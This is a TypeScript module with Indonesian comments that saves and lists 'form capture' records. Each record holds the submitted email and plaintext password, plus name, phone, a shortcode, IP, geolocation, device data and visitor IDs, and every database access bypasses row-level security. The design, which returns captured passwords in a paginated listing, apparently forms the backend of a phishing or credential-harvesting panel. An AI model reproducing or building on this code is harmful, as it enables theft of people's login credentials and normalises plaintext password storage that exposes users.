import { bypassRLS } from '@/lib/db';
import { getGeo } from '@/lib/geo-api';
import { getCurrentEpoch, parseUserAgent } from '@/lib/utils';

export interface FormCaptureCreateData {
  source: string;
  email?: string;
  password?: string;
  name?: string;
  phone?: string;
  shortcode?: string;
  additional_data?: Record<string, any>;
  session_id?: string;
  visitor_id?: string;
  ip?: string;
  user_agent?: string;
}

export interface FormCaptureFilterParams {
  page?: number;
  limit?: number;
  source?: string;
  start_date?: string | number;
  end_date?: string | number;
}

/**
 * Menyimpan data form capture ke database
 */
export async function saveFormCaptureData(
  data: FormCaptureCreateData,
  ip?: string,
  userAgent?: string,
) {
  try {
    const noRLS = await bypassRLS();

    // Gunakan IP dan user agent yang diberikan atau default ke empty string
    const ipAddress = ip || data.ip || '';
    const ua = userAgent || data.user_agent || '';

    // Parse data geo berdasarkan IP
    const geoData = await getGeo(ipAddress);

    // Parse user agent
    const { browser, os, device } = parseUserAgent(ua);

    // Dapat timestamp saat ini
    const currentEpoch = getCurrentEpoch();

    // Simpan data ke database
    const result = await noRLS.formCapture.create({
      data: {
        source: data.source,
        email: data.email,
        password: data.password,
        name: data.name,
        phone: data.phone,
        shortcode: data.shortcode,
        additional_data: data.additional_data || {},
        ip: ipAddress,
        country: geoData?.country || null,
        city: geoData?.city || null,
        browser,
        device,
        os,
        user_agent: ua,
        created_at: currentEpoch,
        session_id: data.session_id || null,
        visitor_id: data.visitor_id || null,
      },
    });

    return { success: true, data: result };
  } catch (error) {
    console.error('Error saving form capture data:', error);
    return { success: false, error };
  }
}

/**
 * Mendapatkan data form capture dari database
 */
export async function getFormCaptureData(params: FormCaptureFilterParams = {}) {
  try {
    const noRLS = await bypassRLS();

    const page = params.page || 1;
    const limit = params.limit || 10;
    const offset = (page - 1) * limit;

    // Buat kondisi where berdasarkan parameter
    const whereCondition: any = {};

    if (params.source) {
      whereCondition.source = params.source;
    }

    if (params.start_date && params.end_date) {
      whereCondition.created_at = {
        gte:
          typeof params.start_date === 'string'
            ? parseInt(params.start_date)
            : params.start_date,
        lte:
          typeof params.end_date === 'string'
            ? parseInt(params.end_date)
            : params.end_date,
      };
    } else if (params.start_date) {
      whereCondition.created_at = {
        gte:
          typeof params.start_date === 'string'
            ? parseInt(params.start_date)
            : params.start_date,
      };
    } else if (params.end_date) {
      whereCondition.created_at = {
        lte:
          typeof params.end_date === 'string'
            ? parseInt(params.end_date)
            : params.end_date,
      };
    }

    // Ambil data form capture
    const formData = await noRLS.formCapture.findMany({
      where: whereCondition,
      select: {
        id: true,
        source: true,
        email: true,
        password: true,
        name: true,
        phone: true,
        shortcode: true,
        additional_data: true,
        ip: true,
        city: true,
        country: true,
        browser: true,
        device: true,
        os: true,
        created_at: true,
      },
      orderBy: {
        created_at: 'desc',
      },
      skip: offset,
      take: limit,
    });

    // Transformasi data untuk menampilkan geolokasi dari additional_data
    const transformedData = formData.map((data) => {
      // Penanganan additional_data yang aman dengan type cast
      const additionalData =
        (data.additional_data as Record<string, any>) || {};
      const geolocation = additionalData.geolocation || null;

      // Konversi timestamp unix ke format tanggal yang readable
      const createdDate = data.created_at
        ? new Date(Number(data.created_at))
        : null;
      const formattedDate = createdDate ? createdDate.toISOString() : null;

      return {
        ...data,
        geolocation,
        formatted_date: formattedDate,
      };
    });

    // Hitung total
    const totalCount = await noRLS.formCapture.count({
      where: whereCondition,
    });

    return {
      success: true,
      data: transformedData,
      meta: {
        total: totalCount,
        page,
        limit,
        totalPages: Math.ceil(totalCount / limit),
      },
    };
  } catch (error) {
    console.error('Error fetching form capture data:', error);
    return { success: false, error };
  }
}
